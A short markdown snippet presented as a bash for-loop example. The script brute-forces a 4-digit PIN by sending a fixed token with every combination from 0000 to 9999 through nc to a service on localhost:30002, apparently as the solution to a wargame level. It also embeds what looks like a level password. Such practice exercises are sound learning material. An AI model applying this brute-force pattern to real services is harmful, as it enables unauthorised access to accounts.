# Example Bash Scripts

### For Loop
```
#!/bin/bash

# Loop through all 4‑digit numeric combinations (0000–9999)
for i in {0000..9999} 
do
        # Append the static token plus the current PIN to a file
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> possibilities.txt
done

# Pipe all generated attempts into the service running on localhost:30002
# and save the server responses to result.txt for later analysis
cat possibilities.txt | nc localhost 30002 > result.txt

```
